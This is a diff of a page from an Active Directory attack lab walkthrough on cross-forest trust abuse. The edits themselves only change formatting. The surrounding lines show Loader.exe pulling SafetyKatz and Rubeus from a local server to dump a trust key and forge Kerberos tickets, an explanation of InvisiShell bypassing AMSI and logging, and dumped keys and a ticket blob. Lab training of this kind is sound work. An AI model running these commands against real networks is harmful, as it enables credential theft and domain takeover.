@@ -318,7 +318,7 @@ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:administra
 InvisiShell is a tool designed to bypass security controls in PowerShell, allowing for the stealthy execution of scripts by circumventing enhanced logging mechanisms and detection by security software.
 Here’s a detailed explanation of how InvisiShell works:
 <ul>
-<li>Bypassing PowerShell Security Measures: InvisiShell is specifically created to bypass system-wide transcription, script block logging, and the Anti-Malware Scan Interface (AMSI). </li>
+<li>Bypassing PowerShell Security Measures: InvisiShell is specifically created to bypass system-wide transcription, script block logging, and the Anti-Malware Scan Interface (AMSI).</li>
 </ul>
 These are security features that Microsoft implemented to monitor and log PowerShell activity.
 <ul>
@@ -523,9 +523,9 @@ We should now be able to execute SafetyKatz on the DC and request for the Trust 
 C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn% /patch" "exit"
 <img src="./images/screenshot_373.png" alt="">
 
-<pre><code>EU.LOCAL (EU / S-1-5-21-3657428294-2017276338-1274645009)
+<pre><code class="language-bash">EU.LOCAL (EU / S-1-5-21-3657428294-2017276338-1274645009)
 Domain: EUVENDOR.LOCAL (EUVENDOR / S-1-5-21-4066061358-3942393892-617142613)
- [  In ] EU.LOCAL -> EUVENDOR.LOCAL
+ [  In ] EU.LOCAL -&gt; EUVENDOR.LOCAL
     </em> 2/11/2025 9:03:15 PM - CLEAR   - f5 7e 9c d0 ff d1 ce 8b 19 fc aa 7b 29 d6 ec 32 03 02 96 f2 7c 18 8b 40 87 fc fd 85 ab f3 b0 41 f1 2c 21 04 8b 92 87 46 7c c1 47 6d d9 6d 7e d0 89 f6 d5 ee 9c 21 e4 6f 69 c4 89 2b 61 40 29 80 9d 40 e4 8c b9 e8 04 64 b4 12 5e b8 e1 d4 b1 25 8f f2 ca 09 f9 18 fe 32 53 d6 c9 93 2a d5 fa 7f a5 60 66 96 fa 77 01 7a 14 ef 50 fe 2f ca c2 a2 36 72 59 51 f7 b6 4e 76 47 ef 63 a0 ec 45 d6 24 6c f7 bd d5 c9 d0 c6 9f 6e c6 c9 55 4f 0a 26 d8 ef e4 06 2f 80 43 fb 52 72 c0 aa 40 a7 c1 ee 93 e8 66 a3 9c 60 ed 3a 7d 37 4e f4 6e 10 cc 14 71 35 85 01 07 70 4a 6f a0 22 57 65 41 7a 72 86 75 22 59 7e f6 6c 7a 0b 5a ac a4 30 19 7b 77 e0 ed 97 1e 46 c8 03 d1 40 64 05 82 20 19 4e 8d c2 1a ba 87 66 11 71 b5 bb 9a d8 94 62 92 6e e6 f5 36
         <em> aes256_hmac       c197d2f364de43df95ff8ef720a1d3e2453c1aaf938085dfaa8b26b9dfcb507a
         </em> aes128_hmac       aae3770ef8a650ef873d2991b18a5f1e
@@ -544,7 +544,7 @@ Using Rubeus will be using silver flag for that.
 C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /user:administrator /ldap /service:krbtgt/eu.local /aes256:c197d2f364de43df95ff8ef720a1d3e2453c1aaf938085dfaa8b26b9dfcb507a /sid:S-1-5-21-3657428294-2017276338-1274645009 /opsec /nowrap
 <img src="./images/screenshot_375.png" alt="">
 
-<pre><code>doIFJzCCBSOgAwIBBaEDAgEWooIEIDCCBBxhggQYMIIEFKADAgEFoQobCEVVLkxPQ0FMoh0wG6ADAgECoRQwEhsGa3JidGd0GwhldS5sb2NhbKOCA+AwggPcoAMCARKhAwIBA6KCA84EggPKG4gtZs082njGNf6c8WG4oLtmihwoM8RaIPCAcZMRMhaPmYxJZgtNr5j85wBEk/J8VEWB0WI0JRNsmozeFbmi739S6DnUPSfocklkHMbEmBjGZV62o41vHb/Y6PbvWNEcngYJ6LGqQOteN/xwb+A+8b5hH+I516RZz0duo2gp7f0vrR64J9ERJU9FXw+JcsJOOHAAw8k1rjfEC1htzLylVUflRwSa58iS9elAf8WHUrdAdL2EIYVz5vEMw2cXEk3BmndR/vVj1ht+u/lKsYgAHbLMxKhhh9JI27dLH1EjP+kXrB710EnfReVCj+LrZd91UjIS1g28rSOZ8+dZmk2DjNfNRuXIPAf/Mn/CSBA3SCEmNL7yLpm294vMi+51RhyvtaVurXXdSZk/eT9fa4C2oUDv46ieaduuX4etn9MHL8MsWPNGz+yxp0z9H5z10zTSanPCJN+2QyFLwGDTVgdnCuoU69Po05gIocMvjuKyoo+/bhF2EScU5o5lzwzCQ0RylwMZZj3SnzTap4J+QmFAV6aQWeExI1xKvGCAi5odFaMaMvBbO8sbwwH1ivenPX20ab9wFMBshvFggoYec9Xn5fsqmX35GD7AgAcNZbbjfy0Nkmt2YbpB0GL3PkoYwFQr3d2cPYEHssS52dVI/N77oJx3Way9yKSgcNX/PdfgU0LJ2kkkG3g6/aG2EujkzZeNUDN27fN4oo2ItKU5Ub7gATJ2WXfBi27XgPLw6nmiew53dVCe4OddBJr6kCF6qFYXeYwkdeP2FTmDQEgG3jO5SZd2CGU+y8U+zj8I+ompgegu02YBBnT2g0Bwd9Boj4VFSx4rsGvY5dC6O6RWVHwiazZq1prpHUIdBPjcI9kVWUZkHYoLCjKG3L2XIw2o/ntdjG16VUI4yTVGKK82+JkKHdAEtFHMO9VQ3aQ7T0f8kTGxXQtRcknABMWlEIULJLbihZNV6Zbtw/B+0KqC1km9Dz7XgaFwic2jPpL6j0Kq5M4mdz5lfOi6OC4R4mU/1RlHK/AhjOYUa/R39oPlz1Ol8maMnV+THAn6jTbF8DKFGO68Fq3vPzcCg2N8iPaz4+Q11R7+FQzDKti1xr3YvEzppZUhsyip9sGR+xok0SA+sHaW3ikGx+XzbVKvX5HZkc5iuWwyrC3/m6iPBImilg5iCH9OEiUH/9RW0/gzTkJ/Ct5C+pUuqb52UBObnTu7XeZyq5RhxJjN/pxRwRJcW9XM3oX4PuSNVINOb9wzylrFbulN8/sCJzwYtBM32bqo4dd3WWfcm9LUvkMpx6OB8jCB76ADAgEAooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIA0w8k1JC4pSwgM7BXE5fr9KL35iDisZ3GqtmvzXUl5VoQobCEVVLkxPQ0FMohowGKADAgEBoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKAAAKQRGA8yMDI1MDIxMjIxNTY0MlqlERgPMjAyNTAyMTIyMTU2NDJaphEYDzIwMjUwMjEzMDc1NjQyWqcRGA8yMDI1MDIxOTIxNTY0MlqoChsIRVUuTE9DQUypHTAboAMCAQKhFDASGwZrcmJ0Z3QbCGV1LmxvY2Fs
+<pre><code class="language-bash">doIFJzCCBSOgAwIBBaEDAgEWooIEIDCCBBxhggQYMIIEFKADAgEFoQobCEVVLkxPQ0FMoh0wG6ADAgECoRQwEhsGa3JidGd0GwhldS5sb2NhbKOCA+AwggPcoAMCARKhAwIBA6KCA84EggPKG4gtZs082njGNf6c8WG4oLtmihwoM8RaIPCAcZMRMhaPmYxJZgtNr5j85wBEk/J8VEWB0WI0JRNsmozeFbmi739S6DnUPSfocklkHMbEmBjGZV62o41vHb/Y6PbvWNEcngYJ6LGqQOteN/xwb+A+8b5hH+I516RZz0duo2gp7f0vrR64J9ERJU9FXw+JcsJOOHAAw8k1rjfEC1htzLylVUflRwSa58iS9elAf8WHUrdAdL2EIYVz5vEMw2cXEk3BmndR/vVj1ht+u/lKsYgAHbLMxKhhh9JI27dLH1EjP+kXrB710EnfReVCj+LrZd91UjIS1g28rSOZ8+dZmk2DjNfNRuXIPAf/Mn/CSBA3SCEmNL7yLpm294vMi+51RhyvtaVurXXdSZk/eT9fa4C2oUDv46ieaduuX4etn9MHL8MsWPNGz+yxp0z9H5z10zTSanPCJN+2QyFLwGDTVgdnCuoU69Po05gIocMvjuKyoo+/bhF2EScU5o5lzwzCQ0RylwMZZj3SnzTap4J+QmFAV6aQWeExI1xKvGCAi5odFaMaMvBbO8sbwwH1ivenPX20ab9wFMBshvFggoYec9Xn5fsqmX35GD7AgAcNZbbjfy0Nkmt2YbpB0GL3PkoYwFQr3d2cPYEHssS52dVI/N77oJx3Way9yKSgcNX/PdfgU0LJ2kkkG3g6/aG2EujkzZeNUDN27fN4oo2ItKU5Ub7gATJ2WXfBi27XgPLw6nmiew53dVCe4OddBJr6kCF6qFYXeYwkdeP2FTmDQEgG3jO5SZd2CGU+y8U+zj8I+ompgegu02YBBnT2g0Bwd9Boj4VFSx4rsGvY5dC6O6RWVHwiazZq1prpHUIdBPjcI9kVWUZkHYoLCjKG3L2XIw2o/ntdjG16VUI4yTVGKK82+JkKHdAEtFHMO9VQ3aQ7T0f8kTGxXQtRcknABMWlEIULJLbihZNV6Zbtw/B+0KqC1km9Dz7XgaFwic2jPpL6j0Kq5M4mdz5lfOi6OC4R4mU/1RlHK/AhjOYUa/R39oPlz1Ol8maMnV+THAn6jTbF8DKFGO68Fq3vPzcCg2N8iPaz4+Q11R7+FQzDKti1xr3YvEzppZUhsyip9sGR+xok0SA+sHaW3ikGx+XzbVKvX5HZkc5iuWwyrC3/m6iPBImilg5iCH9OEiUH/9RW0/gzTkJ/Ct5C+pUuqb52UBObnTu7XeZyq5RhxJjN/pxRwRJcW9XM3oX4PuSNVINOb9wzylrFbulN8/sCJzwYtBM32bqo4dd3WWfcm9LUvkMpx6OB8jCB76ADAgEAooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIA0w8k1JC4pSwgM7BXE5fr9KL35iDisZ3GqtmvzXUl5VoQobCEVVLkxPQ0FMohowGKADAgEBoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKAAAKQRGA8yMDI1MDIxMjIxNTY0MlqlERgPMjAyNTAyMTIyMTU2NDJaphEYDzIwMjUwMjEzMDc1NjQyWqcRGA8yMDI1MDIxOTIxNTY0MlqoChsIRVUuTE9DQUypHTAboAMCAQKhFDASGwZrcmJ0Z3QbCGV1LmxvY2Fs
 </code></pre>
 
 The command you provided is running Loader.exe with the -Path parameter to fetch Rubeus.exe from a local HTTP server. Then, -args passes additional arguments to Rubeus (silver):
@@ -585,7 +585,7 @@ dir \\euvendor-dc.euvendor.local\eushare
 
 
 
-          <div class="part-navigation">
+<div class="part-navigation">
             <a href="part-28-cross-forest-attacks-unconstrained-delegation.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Cross Forest Attacks - Unconst</a>
             <a href="part-30-cross-forest-attacks-injecting-sid-history-to-bypa.html">Next: Cross Forest Attacks - Injecti <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
